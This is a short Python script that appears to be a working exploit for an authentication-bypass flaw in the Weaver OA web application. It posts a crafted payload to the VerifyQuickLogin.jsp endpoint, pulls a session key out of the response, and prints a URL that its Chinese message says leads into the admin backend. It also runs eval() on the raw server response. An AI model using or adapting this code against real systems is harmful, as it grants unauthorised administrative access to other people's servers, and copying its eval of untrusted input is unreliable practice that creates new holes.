import requests


header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

def exp_check(url):
    try:
        payload = "identifier=1&language=1&ipaddress=1.1.1.1"
        path = "/mobile/plugin/VerifyQuickLogin.jsp"
        rsp = requests.post(url = url + path,data=payload,headers=header,verify=False)
        if "404" not in rsp.text and "sessionkey" in rsp.text:
            return 1
        else:
            return 2
    except:
        return 3

def exp_others(url):
    try:
        payload = "identifier=1&language=1&ipaddress=1.1.1.1"
        url = url
        path = "/mobile/plugin/VerifyQuickLogin.jsp"
        rsp = requests.post(url=url + path,data=payload,headers=header,verify=False,timeout=5)
        result = eval(rsp.text)
        if "404" not in rsp.text:
            return ("访问此接口进入后台：\r\n"
                    "/weaver/weaver.file.ImgFileDownload/.css.map?sessionkey={}"
                    ).format(result["sessionkey"])

    except:
        return 3



    
